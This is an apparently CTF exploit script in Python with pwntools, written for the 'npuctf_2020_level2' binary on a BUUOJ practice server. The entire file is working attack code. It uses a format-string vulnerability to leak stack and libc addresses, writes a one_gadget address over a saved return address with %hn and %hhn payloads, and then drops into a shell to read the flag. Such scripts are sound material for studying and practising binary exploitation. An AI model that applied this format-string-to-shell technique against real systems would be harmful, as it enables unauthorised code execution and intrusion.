#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/06/18 08:18:55
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
import functools
from LibcSearcher import *
import pwnlib
debug = 1
context.log_level = 'debug'
context.arch = 'amd64'
if debug:
    sh = process(['./npuctf_2020_level2'],env={'LD_PRELOAD':'/lib/x86_64-linux-gnu/libc.so.6'})
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_offset = [0x45226,0x4527a,0xf03a4,0xf1247]
else:
    IP = 'node3.buuoj.cn'
    port = 25405
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/18-64-libc-2.27.so')
    one_offset = [0x4f2c5,0x4f322,0x10a38c]

def clean():
    for i in range(2):
        sh.sendline('a' * 0x30)
        sh.recv()
        sleep(2)
elf = ELF('npuctf_2020_level2')
sh.sendline("aaaa%9$pbbbb%7$p")
sh.recvuntil("aaaa0x")
stack_ret = int(sh.recv(12),16) - 0xe0
sh.recvuntil("bbbb0x")
libc_base = int(sh.recv(12),16) - 240 - libc.symbols['__libc_start_main']
log.info("Success leak stack_ret_addr:0x%x"%stack_ret) 
log.info("Success leak libc_base:0x%x"%libc_base)
one_gadget = libc_base + 0x45226
stack_ret_low = stack_ret & 0xffff

payload = "%{}c%9$hn".format(stack_ret_low)
sh.sendline(payload)
clean()

one_low = one_gadget & 0xffff
payload = "%{}c%35$hn".format(one_low)
sh.sendline(payload)
clean()

# stack_ret_high = (stack_ret & 0xff) + 2
# payload = "%{}c%9$hhn".format(stack_ret_high)
# sh.sendline(payload)
# clean()

one_high = (one_gadget >> 16) & 0xff
payload = "%{}c%35$hhn".format(one_high)
sh.sendline(payload)
clean()

gdb.attach(sh)
pause()

sh.send("6" * 8 + '\x00' * 8)
sleep(3)
sh.sendline("cat flag")
sh.interactive()